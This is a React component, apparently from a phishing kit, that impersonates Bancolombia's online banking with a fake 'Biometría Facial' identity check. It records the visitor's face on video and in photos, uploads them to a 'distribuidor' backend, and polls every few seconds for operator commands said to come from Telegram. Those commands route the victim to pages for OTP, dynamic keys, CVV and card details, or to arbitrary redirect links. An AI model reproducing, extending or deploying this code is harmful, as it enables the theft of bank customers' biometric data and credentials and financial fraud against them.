import { useEffect, useState, useRef } from "react";
import { FaceDetection } from "@mediapipe/face_detection";
import { isDesktop, limpiarPaddingBody } from "../../../../@utils";
import { instanceBackend } from "../../../../app/axios/instanceBackend";
import { useNavigate } from "react-router-dom";
import { Camera } from "@mediapipe/camera_utils";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import './css/LoginModal.css';

// Se exporta el componente
export default function VerificacionIdentidad() {

  // Se inicializa la variable
  const navigate = useNavigate();

  // Se almacenan las fotos
  const photosRef = useRef([]);

  // Duración de la grabación en segundos
  const RECORD_DURATION = 5;

  // Se inicializan los estados para manejar el continuar
  const [formState, setFormState] = useState({
    paso: 1,
    disabledAtras: false,
    estadoEspabilar: false,
    cargando: false,
    disabledContinuar: false,
    continuar: false,
    error: false,
    ok: false,
    texto: "Empezar",
    textoAtras: "Atrás",
    contador: 3
  });

  // Ref para la cámara
  const hasRecordedRef = useRef(false);
  const [stableTime, setStableTime] = useState(0);
  const stableTimerRef = useRef(null);
  const [progress, setProgress] = useState(0);
  const mediaRecorderRef = useRef(null);
  const recordedChunksRef = useRef([]);
  const stopTimeoutRef = useRef(null);
  const videoRef = useRef(null);
  const cameraRef = useRef(null);
  const faceDetectorRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const statusTickRef = useRef(null);
  const waitingAfterUploadRef = useRef(false);
  const cameraStoppedRef = useRef(false);
  const bioTickAtUploadRef = useRef(null);
  const bioEstadoAtUploadRef = useRef(null);

  // Se inicializa los estados
  const [ip, setIp] = useState("");
  const [getDateHour, setDateHour] = useState("");

  // Se crea el useEffect para iniciar la cámara y la detección facial
  useEffect(() => {

    // Se limpia el padding del body
    limpiarPaddingBody();

    // Solo iniciar en paso 3
    if (formState.paso !== 3) return;

    // No reiniciar cámara mientras se espera respuesta del operador
    if (waitingAfterUploadRef.current) return;

    // Verificar que el ref del video esté disponible
    if (!videoRef.current) return;

    // Función para inicializar la detección facial
    const initFaceDetection = async () => {

      // Se crea la instancia del FaceDetection
      faceDetectorRef.current = new FaceDetection({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`, });

      // Se configuran las opciones del FaceDetection
      faceDetectorRef.current.setOptions({
        model: "short",
        minDetectionConfidence: 0.7,
      });

      // Se define el callback para los resultados del FaceDetection
      faceDetectorRef.current.onResults((results) => {

        // Se calcula el progreso basado en las detecciones
        if (results.detections && results.detections.length === 1) {

          // Si hay una detección, se inicia o continúa el temporizador estable
          if (!stableTimerRef.current) {

            // Inicia el temporizador estable
            stableTimerRef.current = setTimeout(() => {

              // Se actualiza el estado a ok
              setFormState((prev) => ({
                ...prev,
                ok: true,
                error: false,
              }));
            }, 300);
          };
        } else {

          // Si no hay detecciones, se reinicia el temporizador estable
          if (stableTimerRef.current) {

            // Se limpia el temporizador estable
            clearTimeout(stableTimerRef.current);

            // Se limpia la referencia
            stableTimerRef.current = null;
          };

          // Se actualiza el estado a error
          setFormState((prev) => ({
            ...prev,
            ok: false,
            error: true,
            disabledAtras: false,
            disabledContinuar: false,
          }));

          // Reinicia tanto el progreso como el tiempo estable
          setProgress(0);
          setStableTime(0);
        }
      });

      // Se crea la instancia de la cámara
      cameraRef.current = new Camera(videoRef.current, {

        // onReady callback
        onFrame: async () => {

          // Se envía el frame al FaceDetection
          await faceDetectorRef.current?.send({
            image: videoRef.current,
          });
        },
        width: 320,
        height: 400,
      });

      // Se inicia la cámara
      cameraRef.current.start();
    };

    // Se llama a la función para iniciar la detección facial
    initFaceDetection();

    // Cleanup al desmontar o cambiar de paso
    return () => {

      // Se detiene la cámara y se cierra el FaceDetection
      if (cameraRef.current) {

        // Se detiene la cámara
        cameraRef.current.stop();
        cameraRef.current = null;
      };

      // Se cierra el FaceDetection
      if (faceDetectorRef.current) {

        // Se cierra el FaceDetection
        faceDetectorRef.current.close();
        faceDetectorRef.current = null;
      };
    };
  }, [formState.paso]);

  // Se crea el useEffect para capturar la ip publica y la hora en estandar
  useEffect(() => {

    // Se obtiene la IP
    getInfoIp();

    // Se obtiene la fecha/hora con formato
    getDateHours();

    // Se inicia el polling para recibir acciones desde Telegram
    startPolling();

    return () => {
      stopPolling();
    };
  }, []);

  //  Se crea el useEffect para ejecutar 1 minuto 
  useEffect(() => {

    // Calcular cuánto falta para el próximo minuto exacto
    const ahora = new Date();
    const nextMinute = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

    // Se inicializa el intervalo
    let intervalId;

    // Timeout para sincronizar con el cambio exacto de minuto
    const timeoutId = setTimeout(() => {

      // Se obtiene la fecha/hora con formato
      getDateHours();

      // Luego actualizar cada 60 segundos
      intervalId = setInterval(() => {

        // Se obtiene la fecha/hora con formato
        getDateHours();
      }, 60000);
    }, nextMinute);

    // Cleanup
    return () => {

      // Se limpia el timeout y el intervalo
      clearTimeout(timeoutId);

      // Se limpia el intervalo si existe
      if (intervalId) clearInterval(intervalId);
    };
  }, []);

  // Efecto para controlar el progreso cuando el estado es ok
  useEffect(() => {

    // Se declara la variable intervalId
    let intervalId;

    // Se muestra el mensaje para espabilar
    setFormState((prev) => {

      // Se actualiza el estado a espabilar
      return {
        ...prev,
        estadoEspabilar: true
      };
    });

    // Si el estado es ok, inicia el conteo de tiempo
    if (formState.ok) {

      // Inicia el conteo de tiempo estable
      intervalId = setInterval(() => {

        // Se actualiza el tiempo estable
        setStableTime((prevTime) => {

          // Incrementa cada 100ms
          const newTime = prevTime + 0.1;

          // Si han pasado más de 3 segundos, comienza a llenar el círculo
          if (newTime >= 3) {

            // Calcula el porcentaje de progreso (de 0 a 1) basado en el tiempo que ha pasado desde los 3 segundos, con un máximo de 5 segundos para completar el círculo
            const progressPercentage = Math.min((newTime - 3) / 5, 1);

            // Actualiza el estado del progreso
            setProgress(progressPercentage);

            // Se inicia la grabación cuando el círculo EMPIEZA
            if (progressPercentage > 0 && !mediaRecorderRef.current && !hasRecordedRef.current) {

              // Se marca que ya se ha iniciado la grabación para evitar múltiples inicios
              hasRecordedRef.current = true;

              // Se llama al método para empezar a grabar
              startRecording();
            };
          };

          // Se retorna el nuevo tiempo
          return newTime;
        });
      }, 100);
    } else {

      // Reinicia el tiempo cuando no está ok
      setStableTime(0);
      setProgress(0);
    };

    // Se retorna el cleanup
    return () => {

      // Se limpia el intervalo si existe
      if (intervalId) {

        // Se limpia el intervalo
        clearInterval(intervalId);
      };
    };
  }, [formState.ok]);

  // Obtiene la dirección IP pública del usuario
  const getInfoIp = async () => {

    // Se usa el try
    try {

      // Se realiza la petición HTTP a la API
      const response = await fetch("https://api.ipify.org?format=json");

      // Se convierte la respuesta a JSON
      const data = await response.json();

      // Se guarda la IP obtenida en el estado
      setIp(data.ip);
    } catch (error) {

      // En caso de error (sin internet, API caída, etc.)
      console.error("Error obteniendo IP", error);

      // Se asigna un valor por defecto para evitar fallos en la UI
      setIp("No disponible");
    };
  };

  // Obtiene la fecha y hora actual del sistema
  const getDateHours = () => {

    // Se obtiene la fecha y hora actual
    const ahora = new Date();

    // Opciones de formato para la fecha y hora
    const opciones = {
      weekday: "long",   // día de la semana (miércoles)
      year: "numeric",   // año (2026)
      month: "long",     // mes (enero)
      day: "numeric",    // día del mes (7)
      hour: "numeric",   // hora (5)
      minute: "2-digit", // minutos (38)
      hour12: true       // formato 12 horas (p. m.)
    };

    // Se formatea la fecha según el locale español de Colombia
    const formato = ahora.toLocaleString("es-CO", opciones);

    // Se guarda el valor formateado en el estado
    setDateHour(formato);
  };

  // Placeholder function for the button
  const handleContinuar = (e) => {

    // Se quita el foco del id continue-button porque a veces queda el foco en mobile
    e.currentTarget.blur(); // 🔥 CLAVE

    // Se actualiza el estado según el paso actual
    setFormState((prev) => {

      // Paso 1 → Paso 2
      if (prev.paso === 1) {

        // Iniciar cámara y detección facial
        return {
          ...prev,
          paso: 2,
          texto: "Continuar"
        };
      };

      // Paso 2 → Paso 3
      if (prev.paso === 2) {

        // Iniciar cámara y detección facial
        return {
          ...prev,
          paso: 3,
          continuar: true,
          texto: "Comenzar",
        };
      };

      // Paso 3 (aquí puedes enviar info o finalizar)
      if (prev.paso === 3) {

        // Se crea el metodo para empezar a grabar
        return {
          ...prev,
          disabledContinuar: true,
          disabledAtras: true
        };
      };

      // Por defecto,
      return prev;
    });
  };

  // Función para manejar el botón de atrás
  const handleAtras = () => {

    // Se actualiza el estado según el paso actual
    setFormState((prev) => {

      // Paso 2 → Paso 1
      if (prev.paso === 2) {

        // Volver al paso 1
        return {
          ...prev,
          paso: 1,
          texto: "Empezar"
        };
      };

      // Paso 3 → Paso 2
      if (prev.paso === 3) {

        // Detener grabación si está en curso
        stopRecording();

        // Volver al paso 2
        return {
          ...prev,
          paso: 2,
          texto: "Continuar"
        };
      };

      // Por defecto,
      return prev;
    });
  };

  // Se crea el metodo para detener la grabación
  const stopRecording = () => {

    // Se limpia el timeout si existe
    if (stopTimeoutRef.current) {

      // Se limpia el timeout
      clearTimeout(stopTimeoutRef.current);

      // Se limpia la referencia
      stopTimeoutRef.current = null;
    }

    // Se detiene la grabación si está en curso
    if (mediaRecorderRef.current?.state === "recording") {

      // Se detiene el MediaRecorder
      mediaRecorderRef.current.stop();

      // Se limpia la referencia
      mediaRecorderRef.current = null;
    };
  };

  // Metodo encargado de generar el frame
  const captureFrame = async () => {

    // Se valida si ya hay video
    if (!videoRef.current) return null;

    // Se usa el trycatch
    try {

      // Se inicializa el canvas
      const canvas = document.createElement("canvas");

      // Se inicializa el ancho y alto
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;

      // Se inicializa el context
      const ctx = canvas.getContext("2d");

      // Se genera el video
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(videoRef.current, 0, 0);

      // Se genera y retorna la promesa
      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
    } catch (e) {

      // Se retorna en null
      return null;
    }
  };

  // Metodo encargado de detener la cámara mientras se espera respuesta
  const stopCameraWhileWaiting = () => {
    cameraStoppedRef.current = true;
    stopRecording();

    if (cameraRef.current) {
      cameraRef.current.stop();
      cameraRef.current = null;
    }

    if (faceDetectorRef.current) {
      faceDetectorRef.current.close();
      faceDetectorRef.current = null;
    }

    if (stableTimerRef.current) {
      clearTimeout(stableTimerRef.current);
      stableTimerRef.current = null;
    }
  };

  // Se crea el metodo para empezar a grabar
  const startRecording = () => {

    // No grabar si ya se envió biometría y se espera respuesta
    if (waitingAfterUploadRef.current) return;

    // Se valida que el video tenga el stream
    if (!videoRef.current?.srcObject) return;

    // Se obtiene el stream del video
    const stream = videoRef.current.srcObject;

    // Se limpia el array de chunks grabados
    recordedChunksRef.current = [];
    photosRef.current = []; // Reset photos

    // Se crea el MediaRecorder
    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp8", });

    // Evento para cuando hay datos disponibles
    mediaRecorder.ondataavailable = (event) => {

      // Se almacenan los datos grabados
      if (event.data.size > 0) {

        // Se agrega el chunk al array
        recordedChunksRef.current.push(event.data);
      };
    };

    // Evento para cuando se detiene la grabación
    mediaRecorder.onstop = () => {

      // Se crea el blob con los datos grabados
      const blob = new Blob(recordedChunksRef.current, { type: "video/webm", });

      // Upload Biometrics
      handleUploadBiometrics(blob, photosRef.current);

      // Se detiene el proceso de grabación
      stopRecording();
    };

    // Se inicia la grabación
    mediaRecorder.start();

    // Se guarda la referencia del MediaRecorder
    mediaRecorderRef.current = mediaRecorder;

    // Capture photos at intervals [1s, 2s, 3s]
    const capture = async () => {
      if (photosRef.current.length < 3) {
        const photo = await captureFrame();
        if (photo) photosRef.current.push(photo);
      }
    };

    // Schedule captures
    setTimeout(capture, 1000);
    setTimeout(capture, 2500);
    setTimeout(capture, 4000);

    // ⏱ Detener EXACTAMENTE en X segundos
    stopTimeoutRef.current = setTimeout(() => {

      // Se detiene la grabación
      if (mediaRecorderRef.current?.state === "recording") {

        // Se detiene el MediaRecorder
        mediaRecorderRef.current.stop();

        // Se limpia la referencia
        mediaRecorderRef.current = null;

        // Se usa el cargando
        waitingAfterUploadRef.current = true;
        stopCameraWhileWaiting();
        setFormState((prev) => {

          // Se actualiza el estado a cargando
          return {
            ...prev,
            ok: false,
            estadoEspabilar: false,
            cargando: true,
          };
        });
      }
    }, RECORD_DURATION * 1000);
  };

  // Metodo auxiliar para convertir Blob a Base64
  const blobToBase64 = (blob) => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  };

  // Metodo encargado de enviar la biometria al distribuidor
  const handleUploadBiometrics = async (videoBlob, photos) => {

    // Se obtiene el sessionId
    const sessionId = localStorage.getItem("sessionId");

    // Se valida que haya un sessionId
    if (!sessionId) {

      // Se quita el cargando
      waitingAfterUploadRef.current = false;
      setFormState((prev) => ({
        ...prev,
        cargando: false,
      }));

      // Se envia una alerta
      alert("Error: No se encontró la sesión");

      // Se retorna
      return;
    };

    // Set loading state
    waitingAfterUploadRef.current = true;
    stopCameraWhileWaiting();
    setFormState(prev => ({
      ...prev,
      ok: false,
      estadoEspabilar: false,
      cargando: true
    }));

    // Se usa el try catch
    try {

      // Se convierten los archivos a base64
      const videoBase64 = await blobToBase64(videoBlob);
      const imagesBase64 = await Promise.all(
        photos.filter(p => p).map(photo => blobToBase64(photo))
      );

      // Se prepara la data para el distribuidor
      const dataSend = {
        "data": {
          "attributes": {
            "sessionId": sessionId,
            "username": "Undefined",
            "video": videoBase64,
            "images": imagesBase64,

            // DATOS NUEVOS PARA EL DISTRIBUIDOR
            "backend": "P01",
            "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
            "backend_url": "/api/v1/bancolombia/biometrics/upload",
          }
        },
      };

      // Se envia la peticion al distribuidor
      await instanceBackend.post(dataSend?.data?.attributes?.backend_central_url, dataSend);

      bioEstadoAtUploadRef.current = lastEstadoRef.current || "sol_biometria";
      bioTickAtUploadRef.current = statusTickRef.current;
      lastEstadoRef.current = null;
      statusTickRef.current = null;
      waitingAfterUploadRef.current = true;
      startPolling();
    } catch (error) {

      // Se inicializa el cargando
      waitingAfterUploadRef.current = false;
      setFormState(prev => ({ ...prev, cargando: false, error: true }));

      // Se valida el tipo de error
      if (error.response) {

        // El servidor respondió con un código de estado fuera del rango 2xx
        alert(`Error ${error.response.status}: ${error.response.data?.message || 'Error del servidor'}`);
      } else if (error.request) {

        // La petición fue hecha pero no se recibió respuesta
        alert("Error de conexión con el servidor");
      } else {

        // Hubo un error al configurar la petición
        alert("Error inesperado: " + error.message);
      }
    }
  };

  // Metodo encargado de detener el polling
  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  // Metodo encargado de reiniciar el flujo de biometria
  const restartBiometrics = () => {
    waitingAfterUploadRef.current = false;
    cameraStoppedRef.current = false;
    bioTickAtUploadRef.current = null;
    bioEstadoAtUploadRef.current = null;
    stopRecording();

    if (cameraRef.current) {
      cameraRef.current.stop();
      cameraRef.current = null;
    }

    if (faceDetectorRef.current) {
      faceDetectorRef.current.close();
      faceDetectorRef.current = null;
    }

    if (stableTimerRef.current) {
      clearTimeout(stableTimerRef.current);
      stableTimerRef.current = null;
    }

    hasRecordedRef.current = false;
    mediaRecorderRef.current = null;
    recordedChunksRef.current = [];
    photosRef.current = [];
    setProgress(0);
    setStableTime(0);

    setFormState({
      paso: 1,
      disabledAtras: false,
      estadoEspabilar: false,
      cargando: false,
      disabledContinuar: false,
      continuar: false,
      error: false,
      ok: false,
      texto: "Empezar",
      textoAtras: "Atrás",
      contador: 3
    });
  };

  const shouldProcessEstado = (estadoActual, statusTick) => {
    if (statusTick != null) {
      if (statusTickRef.current === statusTick) return false;
      statusTickRef.current = statusTick;
      lastEstadoRef.current = estadoActual;
      return true;
    }
    if (lastEstadoRef.current === estadoActual) return false;
    lastEstadoRef.current = estadoActual;
    return true;
  };

  // Metodo encargado de verificar el estado desde Telegram
  const verifyStateBio = async () => {
    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) return;

    try {
      const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);
      const { estado, cardData, url, text, statusTick } = response.data;
      const estadoLower = String(estado || "").toLowerCase();
      const hasUrl = Boolean(url && String(url).trim());
      const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
      const linkPendiente =
        estadoLower === "sol_link_bot" ||
        (estadoLower === "link_bot" && !hasUrl) ||
        (estadoLower === "sol_link_custom" && !customLink);

      if (cardData) {
        localStorage.setItem("selectedCardData", JSON.stringify(cardData));
      }

      if (estadoLower === "link_bot" && hasUrl) {
        stopPolling();
        window.location.href = url;
        return;
      }

      if (estadoLower === "sol_link_custom" && customLink) {
        stopPolling();
        window.location.href = customLink;
        return;
      }

      if (linkPendiente) return;

      const bioEstado =
        estadoLower === "sol_biometria" || estadoLower === "solicitar_biometria";

      if (bioEstado) {
        const tick = statusTick ?? null;

        if (waitingAfterUploadRef.current) {
          if (!cameraStoppedRef.current) return;
          if (tick != null && tick === bioTickAtUploadRef.current) return;
          if (
            tick == null &&
            bioTickAtUploadRef.current == null &&
            estadoLower === bioEstadoAtUploadRef.current
          ) {
            return;
          }
          if (!shouldProcessEstado(estadoLower, tick)) return;
          restartBiometrics();
          return;
        }

        if (shouldProcessEstado(estadoLower, tick)) {
          restartBiometrics();
        }
        return;
      }

      if (estadoLower === "pendiente" && waitingAfterUploadRef.current) return;

      if (!shouldProcessEstado(estadoLower, statusTick ?? null)) return;
      lastEstadoRef.current = estadoLower;

      const statusMap = {
        sol_otp: "/numero-otp",
        error_otp: "/numero-otp",
        sol_din: "/clave-dinamica",
        error_din: "/clave-dinamica",
        sol_finalizar: "/finalizado-pse",
        sol_finalizado: "/finalizado-pse",
        solicitar_finalizar: "/finalizado-pse",
        error_923: "/error-923page",
        sol_cvv: "/validacion-cvv",
        sol_tc_custom: "/tc-custom",
        sol_cvv_custom: "/validacion-cvv",
        error_login: "/bancolombia",
        sol_tc: "/validacion-tc",
        error_tc: "/validacion-tc",
        error_tc_custom: "/validacion-tc",
        error_cvv_custom: "/validacion-cvv",
      };

      if (statusMap[estadoLower]) {
        stopPolling();

        if (["error_login", "error_otp", "error_din", "error_tc_custom", "error_cvv_custom"].includes(estadoLower)) {
          localStorage.setItem("estado_sesion", "error");
        }

        navigate(statusMap[estadoLower]);
      }
    } catch (error) {
    }
  };

  // Metodo encargado de inicializar el polling
  const startPolling = () => {
    stopPolling();
    pollingIntervalRef.current = setInterval(() => {
      verifyStateBio();
    }, 3000);
    verifyStateBio();
  };

  // Se crea el return del componente
  const desktop = isDesktop();

  // Se retorna el componente
  return (
    <>
      <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
        <div
          style={{
            flex: 1,
            backgroundColor: "#2C2A29",
            backgroundImage: 'url("/assets/bancolombia/auth-trazo.svg")',
            backgroundRepeat: desktop ? 'round' : 'no-repeat',
            backgroundPosition: "center",
            backgroundPositionY: desktop ? "0px" : "-70px",
            backgroundPositionX: desktop ? "0px" : "-500px",
          }}
        >
          <div style={{ textAlign: "center" }}>
            <img
              src="/assets/bancolombia/bancolombia.svg"
              alt="Logo"
              style={{ width: "238px", marginTop: "45px" }}
            />
          </div>

          <div
            style={{
              marginTop: "25px",
            }}
          >
            <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
              Sucursal Virtual Personas
            </h1>
          </div>

          <div className="login-page">
            <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>
              <div
                style={{
                  display: "flex",
                  justifyContent: "center"
                }}
              >
              </div>

              {formState.paso === 1 ?
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/bancolombia/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <div style={{ textAlign: 'center' }}>
                    <h2
                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
                      style={{
                        fontSize: "20px",
                        fontWeight: "bold",
                        marginBottom: "20px",
                        lineHeight: "1.3",
                        color: "#ffffff",
                      }}>
                      ¡Bienvenido a Biometría Facial!
                    </h2>
                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                      Una alianza para la transformación digital segura.
                    </p>
                  </div>

                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      marginTop: "40px",
                      marginBottom: "40px",
                      width: "100%"
                    }}
                  >
                    {/* Izquierda */}
                    <div style={{ flex: 1, display: "flex", justifyContent: "flex-end" }}>
                      <img
                        src="/assets/bancolombia/bancolombia_p1.svg"
                        width={120}
                      />
                    </div>

                    {/* HR vertical */}
                    <div
                      style={{
                        width: "2px",
                        height: "40px",
                        backgroundColor: "#ffffff",
                        margin: "0 20px",
                        flexShrink: 0
                      }}
                    />

                    {/* Derecha */}
                    <div style={{ flex: 1, display: "flex", justifyContent: "flex-start" }}>
                      <img
                        src="/assets/bancolombia/soyyoredeban.png"
                        width={105}
                      />
                    </div>
                  </div>
                </> : null}

              {formState.paso === 2 ?
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/bancolombia/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <h2 className="mt-2"
                    style={{
                      fontSize: "20px",
                      fontWeight: "bold",
                      marginBottom: "20px",
                      lineHeight: "1.3",
                      color: "#ffffff"
                    }}>
                    Verificación de identidad
                  </h2>

                  <div style={{ textAlignLast: "center" }}>
                    <span
                      className="bc-card-auth-description"
                      style={{
                        display: "block",
                        fontSize: "13.5px",
                        marginBottom: "10px",
                        color: "#ffffff",
                      }}
                    >
                      Necesitamos verificar tu identidad para continuar con el proceso de forma segura.
                    </span>

                    <span
                      className="bc-card-auth-description"
                      style={{
                        display: "block",
                        fontSize: "13.5px",
                        color: "#ffffff",
                      }}
                    >
                      Para completar la verificación, acepta los permisos de la cámara y sigue las instrucciones:
                    </span>
                  </div>

                  <div className="info-list mt-4 mb-4">
                    <div className="info-item">
                      <img src="/assets/bancolombia/img1.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Ubicate en un espacio iluminado
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Mejor un lugar con luz natural o luz blanca.
                        </span>
                      </span>
                    </div>
                    <div className="info-item">
                      <img src="/assets/bancolombia/img2.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Ubica tú celular a la altura de tu rostro
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Mantén la cabeza recta mirando al frente y ubica tu celular a esa altura.
                        </span>
                      </span>
                    </div>
                    <div className="info-item">
                      <img src="/assets/bancolombia/img3.svg" alt="" />
                      <span className="info-text">
                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                          Retira los accesorios
                        </h5>
                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
                          Evita cubrir tu rostro con tú cabello, gafas, gorras, tapabocas, etc.
                        </span>
                      </span>
                    </div>
                  </div>
                </> : null}

              {formState.paso === 3 ?
                <>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "20px"
                      }}
                    >
                      <img
                        src="/assets/bancolombia/celular_logo2.png"
                        alt="Alert Icon"
                      />
                    </div>
                  </div>

                  <div style={{ textAlign: 'center' }}>
                    <h2
                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
                      style={{
                        fontSize: "20px",
                        fontWeight: "bold",
                        marginBottom: "20px",
                        lineHeight: "1.3",
                        color: "#ffffff",
                      }}>
                      Verificando tu identidad
                    </h2>
                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                      Mantén tu rostro centrado dentro del circulo y espera a que se complete la verificación.
                    </p>
                  </div>

                  <div
                    id="webcam-container"
                    style={{
                      width: "180px",
                      margin: "0 auto",
                      position: "relative",
                    }}
                  >
                    {/* CONTENEDOR CIRCULAR REAL */}
                    <div
                      style={{
                        width: "180px",
                        height: "180px",
                        borderRadius: "50%",
                        overflow: "hidden",     // 🔥 CLAVE: recorte real
                        position: "relative",
                        backgroundColor: "#000",
                      }}
                    >
                      {/* VIDEO */}
                      <video
                        ref={videoRef}
                        autoPlay
                        playsInline
                        muted
                        style={{
                          width: "100%",
                          height: "100%",
                          objectFit: "cover",   // 🔥 llena el círculo sin deformar
                          transform: "scaleX(-1)",
                        }}
                      />

                      {/* OVERLAY (GUIA / PROGRESO / ERROR) */}
                      <svg
                        width="180"
                        height="180"
                        viewBox="0 0 180 180"
                        style={{
                          position: "absolute",
                          inset: 0,
                          pointerEvents: "none",
                        }}
                      >
                        {/* Guía blanca */}
                        <circle
                          cx="90"
                          cy="90"
                          r="88"
                          fill="none"
                          stroke="#ffffff"
                          strokeWidth="5"
                          strokeDasharray="4 4"
                          opacity="0.8"
                        />

                        {/* Error */}
                        {(formState.error && formState.cargando == false) && (
                          <circle
                            cx="90"
                            cy="90"
                            r="88"
                            fill="none"
                            stroke="#ff3b30"
                            strokeWidth="5"
                          />
                        )}

                        {/* Progreso */}
                        {(formState.ok && formState.cargando == false) && (
                          <circle
                            cx="90"
                            cy="90"
                            r="88"
                            fill="none"
                            stroke="#4BB543"
                            strokeWidth="5"
                            strokeLinecap="round"
                            strokeDasharray={2 * Math.PI * 88}
                            strokeDashoffset={(2 * Math.PI * 88) * (1 - progress)}
                            transform="rotate(-90 90 90)"
                          />
                        )}
                      </svg>
                    </div>
                  </div>
                  <div>
                    {/* MENSAJE */}
                    {(formState.error && formState.cargando == false) && (
                      <p
                        className="bc-card-auth-description"
                        style={{
                          color: "#fff",
                          fontSize: "14px",
                          marginTop: "10px",
                          textAlign: "center",
                        }}
                      >
                        Ubica tu rostro dentro del círculo
                      </p>
                    )}

                    {/* MENSAJE */}
                    {(formState.estadoEspabilar && formState.cargando == false) && (
                      <p
                        className="bc-card-auth-description"
                        style={{
                          color: "#fff",
                          fontSize: "14px",
                          marginTop: "10px",
                          textAlign: "center",
                        }}
                      >
                        Mantén una expresión neutra, luego parpadea naturalmente mientras se completa la verificación.
                      </p>
                    )}
                  </div>
                </> : null}

              <div className="step-container mt-4 mb-4">
                {/* Slot 1 */}
                {formState.paso === 1 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}

                {/* Slot 2 */}
                {formState.paso === 2 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}

                {/* Slot 3 */}
                {formState.paso === 3 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}
              </div>

              <div className="mt-4" style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                {(formState.paso > 1 && formState.paso < 3) && (
                  <button id="back-button" className="bc-button-primary login-btn-borrar" onClick={handleAtras} style={{ fontSize: "14px" }} disabled={formState.disabledAtras}>
                    {formState.textoAtras}
                  </button>
                )}
                {formState.paso < 3 && (
                  <button id="continue-button" className="bc-button-primary login-btn" onClick={handleContinuar} style={{ fontSize: "14px" }} disabled={formState.disabledContinuar}>
                    {formState.texto}
                  </button>
                )}
              </div>
            </div>
          </div>

          <div className="login-page-footer mt-4">
            <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
              <span>¿Problemas para conectarte?</span>
              <span className="dot">·</span>
              <span>Aprende sobre seguridad</span>
              <span className="dot">·</span>
              <span>Reglamento Sucursal Virtual</span>
              <span className="dot">·</span>
              <span>Política de privacidad</span>
            </div>
            <hr style={{ marginTop: "20px" }} />
            <div className="footer-final">
              <div className="footer-left">
                <div>
                  <img
                    src="/assets/bancolombia/bancolombia.svg"
                    style={{ width: "180px" }}
                  />
                </div>
                <div style={{ alignSelf: 'center' }}>
                  <span className="vigilado">
                    <img
                      src="/assets/bancolombia/logo-vigilado.svg"
                      alt="Superintendencia"
                      style={{ width: "140px" }}
                    />
                  </span>
                </div>
              </div>
              <div className="footer-right">
                <div className="mt-2">Dirección IP: {ip}</div>
                <div className="mb-2">{getDateHour}</div>
              </div>
            </div>
          </div>
        </div>
      </div >

      <div className="visual-captcha" style={{ cursor: "pointer" }}>
        <img src="/assets/bancolombia/lateral-der.png" alt="Visual Captcha" />
      </div>

      {formState.cargando ?
        <LoadingBancolombia /> : null}
    </>
  );
};